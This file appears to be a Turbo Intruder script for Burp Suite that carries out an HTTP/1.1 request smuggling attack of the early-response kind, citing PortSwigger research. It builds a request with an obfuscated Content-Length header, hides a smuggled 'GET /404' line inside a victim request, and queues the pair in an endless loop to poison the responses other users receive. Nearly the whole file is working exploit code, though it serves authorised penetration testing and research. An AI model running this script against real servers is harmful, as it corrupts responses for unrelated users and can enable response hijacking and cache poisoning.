# Refer to https://portswigger.net/research/http1-must-die
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=1,
                           engine=Engine.BURP,
                           pipeline=False,
                           maxRetriesPerRequest=0,
                           timeout=15
                           )


    # The request should contain an early-response gadget and a (maybe obfuscated) Content-Length header with the value set to %s
    smuggle_req = '''POST /con HTTP/1.1
Host: example.com
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length : %s

'''

    # Customise this to get a poisoned response of your choice
    smuggledLine = 'GET /404 HTTP/1.1'

    # Add extra headers if required
    victim = '''GET / HTTP/1.1
Host: example.com

'''

    # No need to edit below this line
    if '%s' not in smuggle_req:
        raise Exception('Please place %s in the Content-Length header value')

    if not smuggle_req.endswith('\r\n\r\n'):
        raise Exception('Smuggle request must end with a blank line and have no body')

    victim = victim.replace('\r\n', '\r\nA: A'+smuggledLine+'\r\n', 1)

    while True:
        engine.queue(smuggle_req, victim.index(smuggledLine), label='smuggle', fixContentLength=False)
        engine.queue(victim, label='victim')


def handleResponse(req, interesting):
    table.add(req)

    # Uncomment & customise this if you want the run to automatically stop on success
    #if req.label == 'victim' and req.status == 404:
    #    req.engine.cancel()

